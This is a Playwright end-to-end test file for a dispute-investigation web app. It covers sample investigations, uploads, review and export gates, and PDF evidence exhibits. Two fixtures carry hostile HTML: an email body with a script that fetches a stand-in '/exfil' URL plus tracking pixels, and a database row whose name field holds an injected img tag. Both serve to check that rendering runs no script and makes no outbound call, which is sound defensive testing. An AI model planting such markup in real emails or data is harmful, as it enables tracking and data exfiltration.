import { createHash } from 'node:crypto';
import { PDFDocument, PDFName, PDFRawStream } from 'pdf-lib';
import { expect, test, type Page } from "@playwright/test";
import { readFile } from "node:fs/promises";
import type { WorkspaceState } from "../lib/domain";
import { screenManifest } from "../lib/design/screens";

const base = process.env.CAUSALITY_UI_TEST_BASEURL || "http://127.0.0.1:8788";
if (!/^http:\/\/(127\.0\.0\.1|localhost):\d+$/.test(base)) {
  throw new Error(
    "Synthetic browser identities are allowed only against a local preview.",
  );
}

async function setup(page: Page) {
  const id = `ui-test-${crypto.randomUUID()}`;
  const headers = {
    "oai-authenticated-user-id": id,
    "oai-authenticated-user-email": `${id}@example.test`,
    "oai-authenticated-user-full-name": "Synthetic Test Organizer",
    "oai-authenticated-user-full-name-encoding": "percent-encoded-utf-8",
  };
  await page.context().setExtraHTTPHeaders(headers);
  const create = await page.request.post(`${base}/api/workspace`, {
    headers: { ...headers, Origin: base },
    data: { action: "createWorkspace", name: "Synthetic UI Test Workspace" },
  });
  expect(create.status()).toBe(200);
  const seeded = await page.request.post(`${base}/api/workspace`, {
    headers: { ...headers, Origin: base },
    data: { action: "seedDemo" },
  });
  expect(seeded.status()).toBe(200);
  const state = (await seeded.json()) as WorkspaceState;
  // Browser tests deliberately exercise sample mode even when a local AWS session exists.
  await page.route("**/api/investigations", async (route) => {
    if (route.request().method() !== "GET") return route.continue();
    await route.fulfill({
      json: {
        config: {
          bedrockConfigured: false,
          merchantConfigured: false,
          archiveConfigured: false,
          region: "us-east-1",
        },
      },
    });
  });
  return { state, headers };
}

async function openTicket(page: Page, state: WorkspaceState, orderRef: string) {
  const item = state.cases.find((c) => c.orderRef === orderRef);
  expect(item, `Synthetic ticket case ${orderRef} was seeded`).toBeTruthy();
  await page.goto(`/workspace?view=cases&case=${encodeURIComponent(item!.id)}`);
  await expect(
    page.getByRole("button", { name: "Run sample investigation", exact: true }),
  ).toBeVisible();
  return item!;
}

async function runSample(page: Page) {
  await page
    .getByRole("button", { name: "Run sample investigation", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "Investigation complete", exact: true }),
  ).toBeVisible();
  await page.getByRole("tab", { name: "Report", exact: true }).click();
  await page.getByText("Investigation details and source review", { exact: true }).click();
  await expect(
    page.getByText("Deterministic sample. No AWS model was called.", {
      exact: true,
    }),
  ).toBeVisible();
}

test("a sample investigation preserves source inspection and revision-bound review/export", async ({
  page,
}) => {
  const errors: string[] = [];
  page.on("pageerror", (error) => errors.push(error.message));
  const { state } = await setup(page);
  await openTicket(page, state, "ATM-1042");
  await runSample(page);
  await expect(
    page.getByRole("heading", {
      name: "Response supported",
      exact: true,
    }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Download evidence PDF", exact: true }),
  ).toBeEnabled();
  const beforeReview = page.waitForEvent("download");
  await page.getByRole("button", { name: "Download evidence PDF", exact: true }).click();
  const draftPdf = await readFile((await (await beforeReview).path())!);
  expect(draftPdf.subarray(0, 5).toString()).toBe("%PDF-");
  const citation = page
    .locator(".cw-citation")
    .filter({ hasText: "Customer acknowledged finding both tickets" })
    .first();
  if (!(await citation.isVisible())) {
    await page.locator(".cw-finding").filter({ has: citation }).locator("summary").click();
  }
  await citation.click();
  await expect(
    page.getByRole("tab", { name: "Investigation", exact: true }),
  ).toHaveAttribute("aria-selected", "true");
  await expect(page.locator("#case-source-heading")).toHaveText(
    "Customer acknowledged finding both tickets",
  );
  await page.getByRole("tab", { name: "Report", exact: true }).click();
  const draft = page.getByRole("textbox", { name: /Merchant response draft/ });
  await draft.fill(
    `${await draft.inputValue()}\n\nReviewed by the organizer against the source records.`,
  );
  await expect(
    page.getByRole("button", { name: "Approve draft", exact: true }),
  ).toBeDisabled();
  await page.getByRole("button", { name: "Save changes", exact: true }).click();
  await expect(
    page.getByRole("button", { name: "Approve draft", exact: true }),
  ).toBeEnabled();
  await page
    .getByRole("button", { name: "Approve draft", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "Reviewed copy", exact: true }),
  ).toBeVisible();
  const textDownload = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Download evidence PDF", exact: true })
    .click();
  const pdf = await readFile((await (await textDownload).path())!);
  expect(pdf.subarray(0, 5).toString()).toBe("%PDF-");
  const jsonDownload = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Evidence JSON", exact: true })
    .click();
  const packet = JSON.parse(
    await readFile((await (await jsonDownload).path())!, "utf8"),
  );
  expect(packet.draft.status).toBe("approved");
  expect(packet.draft.method).toBe("sample_investigator");
  expect(packet.draft.analysis.evidenceIds.length).toBeGreaterThan(0);
  await draft.fill(`${await draft.inputValue()}\nAn unsaved change.`);
  await expect(
    page.getByRole("button", { name: "Download evidence PDF", exact: true }),
  ).toBeDisabled();
  expect(errors).toEqual([]);
});

test("failed delivery and incomplete evidence produce distinct findings", async ({
  page,
}) => {
  const { state } = await setup(page);
  await openTicket(page, state, "ATM-1043");
  await runSample(page);
  await expect(
    page.getByRole("heading", {
      name: "Conflicting evidence",
      exact: true,
    }),
  ).toBeVisible();
  await expect(
    page.locator(".cw-analysis-gaps > summary"),
  ).toBeVisible();
  await openTicket(page, state, "ATM-1044");
  await runSample(page);
  await expect(
    page.getByRole("heading", {
      name: "More evidence needed",
      exact: true,
    }),
  ).toBeVisible();
});

test("cancellation uses the server action and does not present a completed draft", async ({
  page,
}) => {
  const { state } = await setup(page);
  const item = state.cases.find((c) => c.orderRef === "ATM-1044")!;
  let started = false;
  let cancelled = false;
  let releaseStart: (() => void) | undefined;
  const hold = new Promise<void>((resolve) => {
    releaseStart = resolve;
  });
  const run = {
    id: "synthetic_ui_run",
    caseId: item.id,
    mode: "sample",
    status: "running",
    startedAt: new Date().toISOString(),
    events: [
      {
        id: "step-1",
        at: new Date().toISOString(),
        type: "tool_requested",
        title: "Checking case evidence",
        detail: "Synthetic browser test of cancellation controls.",
      },
    ],
  };
  await page.route("**/api/investigations?caseId=*", (route) =>
    route.fulfill({
      json: {
        run: started
          ? { ...run, status: cancelled ? "cancelled" : "running" }
          : null,
      },
    }),
  );
  await page.route("**/api/investigations", async (route) => {
    if (route.request().method() === "GET")
      return route.fulfill({
        json: {
          config: {
            bedrockConfigured: false,
            merchantConfigured: false,
            archiveConfigured: false,
            region: "us-east-1",
          },
        },
      });
    const body = route.request().postDataJSON();
    if (body.action === "start") {
      started = true;
      await hold;
      await route
        .fulfill({ json: { run: { ...run, status: "cancelled" }, state } })
        .catch(() => undefined);
    } else if (body.action === "cancel") {
      expect(body.runId).toBe(run.id);
      cancelled = true;
      await route.fulfill({ json: { run: { ...run, status: "cancelled" } } });
      releaseStart?.();
    } else await route.continue();
  });
  await openTicket(page, state, "ATM-1044");
  await page
    .getByRole("button", { name: "Run sample investigation", exact: true })
    .click();
  const cancel = page.getByRole("button", {
    name: "Cancel investigation",
    exact: true,
  });
  await expect(cancel).toBeEnabled();
  await cancel.click();
  await expect(
    page.getByRole("heading", { name: "Investigation cancelled", exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Run sample investigation", exact: true }),
  ).toBeEnabled();
  expect(cancelled).toBe(true);
});

test("AWS failure and stale source results stay visible without false success", async ({
  page,
}) => {
  const { state } = await setup(page);
  const item = state.cases.find((c) => c.orderRef === "ATM-1042")!;
  let status = "failed";
  await page.route("**/api/investigations", async (route) => {
    if (route.request().method() === "GET")
      return route.fulfill({
        json: {
          config: {
            bedrockConfigured: true,
            merchantConfigured: false,
            archiveConfigured: false,
            region: "us-east-1",
            modelId: "synthetic-browser-model",
          },
        },
      });
    const body = route.request().postDataJSON();
    expect(body.mode).toBe("bedrock");
    await route.fulfill({
      json: {
        state,
        run: {
          id: `run-${status}`,
          caseId: item.id,
          status,
          mode: "bedrock",
          events: [],
          startedAt: new Date().toISOString(),
          error:
            status === "failed"
              ? "Bedrock is temporarily unavailable. Try again."
              : "Evidence changed while the investigation ran. Run it again.",
        },
      },
    });
  });
  await page.goto(`/workspace?view=cases&case=${encodeURIComponent(item.id)}`);
  await page
    .getByRole("button", { name: "Investigate with AWS", exact: true })
    .click();
  await expect(page.getByRole("alert")).toContainText(
    "Bedrock is temporarily unavailable",
  );
  await expect(
    page.getByRole("heading", { name: "Investigation complete", exact: true }),
  ).toHaveCount(0);
  status = "stale";
  await page
    .getByRole("button", { name: "Investigate with AWS", exact: true })
    .click();
  await expect(page.getByRole("alert")).toContainText("Evidence changed");
  await expect(
    page.getByRole("heading", {
      name: "Evidence changed during the investigation",
      exact: true,
    }),
  ).toBeVisible();
});

test("mobile keeps the Causality workspace and sources within the viewport", async ({
  page,
}) => {
  await page.setViewportSize({ width: 390, height: 844 });
  const { state } = await setup(page);
  await openTicket(page, state, "ATM-1042");
  await expect(page.getByRole("link", { name: "Causality" })).toBeVisible();
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
  ).toBe(true);
  await page.getByRole("button", { name: "Connections", exact: true }).click();
  await page.getByText("More sources & services", { exact: false }).click();
  await expect(
    page.getByRole("heading", { name: "Amazon Bedrock", exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Import approved case", exact: true }),
  ).toBeDisabled();
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
  ).toBe(true);
});

test("an asynchronous AWS response reloads the draft even when the first poll is already complete", async ({
  page,
}) => {
  const { state } = await setup(page);
  const item = state.cases.find((c) => c.orderRef === "ATM-1042")!;
  let started = false;
  let completed = false;
  const run = {
    id: "async_ui_run",
    caseId: item.id,
    mode: "sample",
    status: "running",
    startedAt: new Date().toISOString(),
    events: [],
  };
  await page.route("**/api/investigations?caseId=*", (route) => {
    if (started) completed = true;
    return route.fulfill({
      json: { run: started ? { ...run, status: "completed" } : null },
    });
  });
  await page.route("**/api/investigations", async (route) => {
    if (route.request().method() === "GET")
      return route.fulfill({
        json: {
          config: {
            bedrockConfigured: false,
            merchantConfigured: false,
            archiveConfigured: false,
            region: "us-east-1",
          },
        },
      });
    started = true;
    return route.fulfill({ status: 202, json: { run } });
  });
  const content =
    "Synthetic asynchronous investigation response. Inspect the linked source records before approving this draft.";
  await page.route("**/api/workspace", (route) =>
    route.fulfill({
      json: completed
        ? {
            ...state,
            cases: state.cases.map((current) =>
              current.id !== item.id
                ? current
                : {
                    ...current,
                    draft: {
                      revision: 1,
                      content,
                      status: "draft",
                      method: "sample_investigator",
                      generatedAt: new Date().toISOString(),
                    },
                  },
            ),
          }
        : state,
    }),
  );
  await openTicket(page, state, "ATM-1042");
  await page
    .getByRole("button", { name: "Run sample investigation", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "Investigation complete", exact: true }),
  ).toBeVisible();
  await page.getByRole("tab", { name: "Report", exact: true }).click();
  await expect(
    page.getByRole("textbox", { name: /Merchant response draft/ }),
  ).toHaveValue(content);
  await expect(
    page.getByRole("button", { name: "Download evidence PDF", exact: true }),
  ).toBeEnabled();
});

test.describe("AWS attachment upload controls", () => {
  // S3 is fully intercepted in these UI tests. Deployed bucket CORS/CSP is verified separately.
  test.use({ bypassCSP: true });

  async function openUpload(page: Page, state: WorkspaceState) {
    await openTicket(page, state, "ATM-1042");
    await page
      .getByRole("button", { name: "Add evidence", exact: true })
      .click();
    await page
      .getByRole("button", { name: "Upload a file", exact: true })
      .click();
    await page
      .getByRole("textbox", { name: "Evidence title", exact: true })
      .fill("Synthetic receipt");
  }

  test("uploads to S3 with signed fields and confirms the attachment before displaying it", async ({
    page,
  }) => {
    const { state } = await setup(page);
    const item = state.cases.find((c) => c.orderRef === "ATM-1042")!;
    const calls: string[] = [];
    await page.route("**/api/runtime", (route) =>
      route.fulfill({ json: { storage: "aws", uploads: "presigned" } }),
    );
    await page.route("**/api/evidence/prepare-upload", (route) => {
      const body = route.request().postDataJSON();
      expect(body).toEqual({
        caseId: item.id,
        title: "Synthetic receipt",
        source: "manual",
        fileName: "receipt.txt",
        mimeType: "text/plain",
        size: 21,
      });
      calls.push("prepare");
      return route.fulfill({
        json: {
          uploadId: "synthetic_upload",
          uploadUrl: "https://synthetic-upload.invalid/",
          fields: { key: "private/synthetic", policy: "synthetic-policy" },
          method: "POST",
        },
      });
    });
    await page.route("https://synthetic-upload.invalid/**", (route) => {
      const request = route.request();
      if (request.method() === "OPTIONS")
        return route.fulfill({
          status: 204,
          headers: {
            "Access-Control-Allow-Origin": base,
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Methods": "POST",
          },
        });
      expect(request.method()).toBe("POST");
      expect(request.headers()["content-type"]).toContain(
        "multipart/form-data; boundary=",
      );
      const body = request.postDataBuffer()!.toString();
      expect(body).toContain('name="policy"');
      expect(body).toContain("synthetic-policy");
      expect(body).toContain('filename="receipt.txt"');
      expect(body.indexOf('name="file"')).toBeGreaterThan(
        body.indexOf('name="policy"'),
      );
      expect(request.headers()["authorization"]).toBeUndefined();
      calls.push("s3");
      return route.fulfill({
        status: 204,
        headers: { "Access-Control-Allow-Origin": base },
      });
    });
    await page.route("**/api/evidence/finalize-upload", (route) => {
      expect(route.request().postDataJSON()).toEqual({
        uploadId: "synthetic_upload",
      });
      calls.push("finalize");
      const evidence = {
        id: "uploaded_receipt",
        caseId: item.id,
        source: "manual",
        title: "Synthetic receipt",
        content: "Synthetic receipt 123",
        occurredAt: new Date().toISOString(),
        reference: "Uploaded file",
        fileName: "receipt.txt",
      };
      return route.fulfill({
        json: {
          ...state,
          cases: state.cases.map((current) =>
            current.id !== item.id
              ? current
              : { ...current, evidence: [...current.evidence, evidence] },
          ),
        },
      });
    });
    await openUpload(page, state);
    await page.getByLabel("Evidence file").setInputFiles({
      name: "receipt.txt",
      mimeType: "text/plain",
      buffer: Buffer.from("Synthetic receipt 123"),
    });
    await page
      .getByRole("button", { name: "Upload evidence", exact: true })
      .click();
    await expect(page.getByRole("dialog")).toHaveCount(0);
    await expect(
      page.getByRole("button", { name: /Synthetic receipt/ }),
    ).toBeVisible();
    expect(calls).toEqual(["prepare", "s3", "finalize"]);
  });

  test("rejects files over 10 MB before preparing or uploading them", async ({
    page,
  }) => {
    const { state } = await setup(page);
    let runtimeRequests = 0;
    await page.route("**/api/runtime", (route) => {
      runtimeRequests += 1;
      return route.fulfill({ json: { storage: "aws", uploads: "presigned" } });
    });
    await openUpload(page, state);
    await page.getByLabel("Evidence file").setInputFiles({
      name: "oversize.txt",
      mimeType: "text/plain",
      buffer: Buffer.alloc(10 * 1024 * 1024 + 1, "x"),
    });
    await page
      .getByRole("button", { name: "Upload evidence", exact: true })
      .click();
    await expect(page.getByRole("dialog").getByRole("alert")).toContainText(
      "10 MB or smaller",
    );
    expect(runtimeRequests).toBe(0);
  });

  test("does not finalize a failed S3 upload", async ({ page }) => {
    const { state } = await setup(page);
    let finalizations = 0;
    await page.route("**/api/runtime", (route) =>
      route.fulfill({ json: { storage: "aws", uploads: "presigned" } }),
    );
    await page.route("**/api/evidence/prepare-upload", (route) =>
      route.fulfill({
        json: {
          uploadId: "synthetic_upload",
          uploadUrl: "https://synthetic-upload.invalid/",
          fields: { key: "private/synthetic" },
          method: "POST",
        },
      }),
    );
    await page.route("https://synthetic-upload.invalid/**", (route) =>
      route.fulfill({
        status: 500,
        headers: {
          "Access-Control-Allow-Origin": base,
          "Access-Control-Allow-Headers": "*",
          "Access-Control-Allow-Methods": "POST",
        },
      }),
    );
    await page.route("**/api/evidence/finalize-upload", (route) => {
      finalizations += 1;
      return route.fulfill({ json: state });
    });
    await openUpload(page, state);
    await page.getByLabel("Evidence file").setInputFiles({
      name: "receipt.txt",
      mimeType: "text/plain",
      buffer: Buffer.from("Synthetic receipt"),
    });
    await page
      .getByRole("button", { name: "Upload evidence", exact: true })
      .click();
    await expect(page.getByRole("dialog").getByRole("alert")).toContainText(
      /could not be uploaded|Failed to fetch/,
    );
    expect(finalizations).toBe(0);
  });

  test("retains the legacy multipart upload when the runtime endpoint is absent", async ({
    page,
  }) => {
    const { state } = await setup(page);
    let uploaded = false;
    await page.route("**/api/runtime", (route) =>
      route.fulfill({ status: 404 }),
    );
    await page.route("**/api/evidence/upload", (route) => {
      expect(route.request().headers()["content-type"]).toContain(
        "multipart/form-data",
      );
      expect(route.request().postDataBuffer()!.toString()).toContain(
        'filename="receipt.txt"',
      );
      uploaded = true;
      return route.fulfill({ json: state });
    });
    await openUpload(page, state);
    await page.getByLabel("Evidence file").setInputFiles({
      name: "receipt.txt",
      mimeType: "text/plain",
      buffer: Buffer.from("Synthetic receipt"),
    });
    await page
      .getByRole("button", { name: "Upload evidence", exact: true })
      .click();
    await expect(page.getByRole("dialog")).toHaveCount(0);
    expect(uploaded).toBe(true);
  });
});

test("upstream search filters, case recovery, and setup routes remain available", async ({
  page,
}) => {
  const { state } = await setup(page);
  await page.goto(
    "/workspace?view=cases&search=nonexistent-order&status=needs_review",
  );
  await expect(
    page.getByRole("heading", {
      name: "No cases match that search.",
      exact: true,
    }),
  ).toBeVisible();
  await expect(
    page.getByRole("textbox", { name: "Search cases", exact: true }),
  ).toHaveValue("nonexistent-order");
  await page.reload();
  await expect(
    page.getByRole("combobox", { name: "Filter case status", exact: true }),
  ).toHaveValue("needs_review");
  await page
    .getByRole("button", { name: "Clear search & filters", exact: true })
    .click();
  await expect(page).not.toHaveURL(/search=|status=/);
  await expect(
    page.getByRole("textbox", { name: "Search cases", exact: true }),
  ).toHaveValue("");
  await page.goto("/workspace?view=cases&case=unavailable-case");
  await expect(
    page.getByRole("heading", {
      name: "Case unavailable",
      exact: true,
    }),
  ).toBeVisible();
  await page
    .getByRole("button", { name: "Back to cases", exact: true })
    .click();
  await expect(page.getByRole("table")).toBeVisible();
  await page.getByRole("button", { name: "Overview", exact: true }).click();
  await page
    .getByRole("button", { name: "Setup checklist", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "Workspace setup", exact: true }),
  ).toBeVisible();
  await page.setViewportSize({ width: 390, height: 844 });
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
  ).toBe(true);
  expect(state.cases.length).toBeGreaterThan(0);
});

test("unsaved navigation protection and report preview preserve reviewed export gates", async ({
  page,
}) => {
  const { state } = await setup(page);
  const item = await openTicket(page, state, "ATM-1042");
  await runSample(page);
  const draft = page.getByRole("textbox", { name: /Merchant response draft/ });
  const original = await draft.inputValue();
  await draft.fill(`${original}\nUnsaved organizer note.`);
  await page.getByRole("tab", { name: "Report preview", exact: true }).click();
  await expect(page).toHaveURL(/tab=preview/);
  await expect(
    page.getByRole("heading", { name: "Report preview", exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Download evidence PDF", exact: true }),
  ).toBeDisabled();
  page.once("dialog", (dialog) => {
    expect(dialog.message()).toContain("without saving");
    return dialog.dismiss();
  });
  await page.getByRole("button", { name: "Overview", exact: true }).click();
  await expect(page).toHaveURL(new RegExp(encodeURIComponent(item.id)));
  await expect(
    page.getByRole("heading", { name: "Report preview", exact: true }),
  ).toBeVisible();
  page.once("dialog", (dialog) => dialog.accept());
  await page.getByRole("button", { name: "Overview", exact: true }).click();
  await expect(page).toHaveURL(/view=overview/);
});

test("all upstream synthetic design screens render without reading or writing workspace APIs", async ({
  page,
}) => {
  test.setTimeout(90000);
  const apiRequests: string[] = [];
  const errors: string[] = [];
  page.on("pageerror", (error) => errors.push(error.message));
  await page.route("**/api/**", (route) => {
    apiRequests.push(route.request().url());
    return route.abort();
  });
  for (const screen of screenManifest.filter((item) => item.id !== "landing")) {
    const response = await page.goto(screen.path);
    expect(response?.status(), screen.id).toBe(200);
    await expect(
      page.locator(`[data-design-screen="${screen.id}"]`),
      screen.id,
    ).toBeVisible();
    await expect(page.locator(".cw-design-note"), screen.id).toBeVisible();
  }
  await page.goto("/design/screens?screen=overview-demo");
  await page
    .getByRole("button", { name: "Load sample cases", exact: true })
    .click();
  await expect(
    page.getByText("Design preview only. No workspace data was changed.", {
      exact: true,
    }),
  ).toBeVisible();
  await page.goto("/design/screens?screen=report-approved");
  await page.getByRole("tab", { name: "Investigation", exact: true }).click();
  const sampleAction = page.getByRole("button", {
    name: "Run sample investigation",
    exact: true,
  });
  if (await sampleAction.count()) {
    await sampleAction.click();
    await expect(
      page.getByText(
        "Design preview only. No investigation or storage action was performed.",
        { exact: true },
      ),
    ).toBeVisible();
  }
  expect(apiRequests).toEqual([]);
  expect(errors).toEqual([]);
});

test('review packages never offer submission and the API rejects direct submission', async ({ page }) => {
  const { state, headers } = await setup(page);
  const item = state.cases.find(c => c.orderRef === 'ATM-1042')!;
  await page.goto(`/workspace?view=cases&case=${encodeURIComponent(item.id)}&tab=submission`);
  await expect(page.getByRole('heading', { name: 'Review package', exact: true })).toBeVisible();
  await expect(page.getByRole('button', { name: /submit|review submission/i })).toHaveCount(0);
  const response = await page.request.post(`${base}/api/stripe/submit`, {
    headers: { ...headers, Origin: base },
    data: { caseId: 'nonexistent_submission_boundary_probe', confirmed: true, draftRevision: 1 },
  });
  expect(response.status()).toBe(409);
  expect((await response.json()).code).toBe('submission_disabled');
});


for (const longEmail of [false, true]) test(`retained original ${longEmail ? 'long' : 'short'} email bodies become visual PDF exhibits without scripts or trackers`, async ({ page }) => {
  const { state } = await setup(page);
  const item = state.cases.find(c => c.orderRef === 'ATM-1042')!;
  const emailId = '11111111-1111-4111-8111-111111111111', evidenceId = 'ev_visual_original';
  const capturedAt = '2026-11-08T12:00:00Z';
  const snapshot = JSON.stringify({ schemaVersion: 1, provider: 'resend', caseId: item.id, emailId, capturedAt, message: { id: emailId, from: 'tickets@example.test', to: ['buyer@example.test'], subject: 'Synthetic ticket receipt', created_at: capturedAt, html: '<table style="width:600px;background:#f1f5f9;padding:24px"><tr><td style="background-image:url(https://tracker.example.test/css)"><h1>SYNTHETIC ORIGINAL TICKET</h1><p>Order ATM-1042</p><p>Amount: $42.00</p><p>This is an original provider-body test fixture, not a real customer email.</p><img src="https://tracker.example.test/pixel"><script>parent.__emailExecuted=true;fetch("https://tracker.example.test/exfil")</script></td></tr></table>' + (longEmail ? Array.from({ length: 50 }, (_, i) => `<p>Original body line ${i + 1}. Synthetic pagination fixture.</p>`).join('') : ''), text: null } });
  item.evidence = [{ id: evidenceId, caseId: item.id, source: 'database', title: 'Original email fixture', content: 'Original provider body retained.', occurredAt: capturedAt, reference: `Resend email ${emailId}`, originalEmail: { provider: 'resend', emailId }, fileName: 'original.json', mimeType: 'application/json', fileSha256: createHash('sha256').update(snapshot).digest('hex'), capturedAt, downloadUrl: `/api/evidence/${evidenceId}` }];
  item.findings = [];
  item.draft = { revision: 1, status: 'draft', method: 'evidence_template', generatedAt: capturedAt, content: `Synthetic response referring to the original email. [${evidenceId}]` };
  await page.route('**/api/workspace', route => route.fulfill({ json: state }));
  await page.route(`**/api/evidence/${evidenceId}`, route => route.fulfill({ contentType: 'application/json', body: snapshot }));
  const outbound: string[] = [];
  await page.route('https://tracker.example.test/**', route => { outbound.push(route.request().url()); return route.abort(); });
  await page.goto(`/workspace?view=cases&case=${encodeURIComponent(item.id)}&tab=report`);
  const downloading = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Download evidence PDF', exact: true }).click();
  const downloaded = await downloading;
  const bytes = await readFile((await downloaded.path())!);
  const pdf = await PDFDocument.load(bytes);
  expect(pdf.context.enumerateIndirectObjects().some(([,object]) => object instanceof PDFRawStream && object.dict.get(PDFName.of('Subtype')) === PDFName.of('Image'))).toBe(true);
  expect(outbound).toEqual([]);
  expect(await page.evaluate(() => '__emailExecuted' in window)).toBe(false);
  expect(page.frames()).toHaveLength(1);
  expect(pdf.getPageCount()).toBeGreaterThanOrEqual(longEmail ? 4 : 2);
  await downloaded.saveAs(`.aws-build/original-email-${longEmail ? 'long' : 'short'}-synthetic.pdf`);
});

test('native provider receipts and original database rows are embedded as visual evidence', async ({ page }) => {
  const { state } = await setup(page), item = state.cases.find(c => c.orderRef === 'ATM-1042')!;
  const capturedAt = '2026-11-08T12:00:00Z';
  const native = await PDFDocument.create(); native.addPage([400, 500]).drawText('SYNTHETIC PROVIDER RECEIPT', { x: 30, y: 450, size: 16 });
  const receipt = Buffer.from(await native.save());
  const raw = JSON.stringify({ schemaVersion: 1, provider: 'supabase', caseId: item.id, projectRef: 'syntheticproject', table: 'orders', capturedAt, query: { sql: 'SELECT id, name, email FROM orders WHERE id = $1 LIMIT 2', parameters: ['ORDER-42'] }, rows: [{ id: 'ORDER-42', name: '<img src="https://tracker.example.test/row">', email: 'customer@example.test' }] });
  item.evidence = [
    { id: 'native_receipt', caseId: item.id, source: 'stripe', title: 'Original receipt fixture', content: 'Original provider PDF retained.', occurredAt: capturedAt, reference: 'ch_synthetic', originalDocument: { provider: 'stripe', kind: 'receipt', sourceId: 'ch_synthetic' }, mimeType: 'application/pdf', fileName: 'receipt.pdf', capturedAt, fileSha256: createHash('sha256').update(receipt).digest('hex'), downloadUrl: '/api/evidence/native_receipt' },
    { id: 'original_rows', caseId: item.id, source: 'database', title: 'Original database result fixture', content: 'Original query result retained.', occurredAt: capturedAt, reference: 'synthetic/orders', originalRows: { provider: 'supabase', projectRef: 'syntheticproject', table: 'orders', rowCount: 1 }, mimeType: 'application/json', fileName: 'rows.json', capturedAt, fileSha256: createHash('sha256').update(raw).digest('hex'), downloadUrl: '/api/evidence/original_rows' },
  ];
  item.findings = []; item.draft = { revision: 1, status: 'draft', method: 'evidence_template', generatedAt: capturedAt, content: 'Synthetic response. [native_receipt] [original_rows]' };
  await page.route('**/api/workspace', route => route.fulfill({ json: state }));
  await page.route('**/api/evidence/native_receipt', route => route.fulfill({ contentType: 'application/pdf', body: receipt }));
  await page.route('**/api/evidence/original_rows', route => route.fulfill({ contentType: 'application/json', body: raw }));
  const requests: string[] = []; await page.route('https://tracker.example.test/**', route => { requests.push(route.request().url()); return route.abort(); });
  await page.goto(`/workspace?view=cases&case=${encodeURIComponent(item.id)}&tab=report`);
  await expect(page.getByText('2 original files will appear as visual exhibits.', { exact: false })).toBeVisible();
  const downloading = page.waitForEvent('download'); await page.getByRole('button', { name: 'Download evidence PDF', exact: true }).click();
  const file = await downloading, pdf = await PDFDocument.load(await readFile((await file.path())!));
  const objects = pdf.context.enumerateIndirectObjects().map(([,object]) => object).filter(object => object instanceof PDFRawStream);
  expect(objects.some(o => o.dict.get(PDFName.of('Subtype')) === PDFName.of('Image'))).toBe(true);
  expect(objects.some(o => o.dict.get(PDFName.of('Subtype')) === PDFName.of('Form'))).toBe(true);
  expect(objects.filter(o => o.dict.get(PDFName.of('Type')) === PDFName.of('EmbeddedFile'))).toHaveLength(2);
  expect(requests).toEqual([]);
  await file.saveAs('.aws-build/visual-source/native-receipt-and-rows-synthetic.pdf');
});
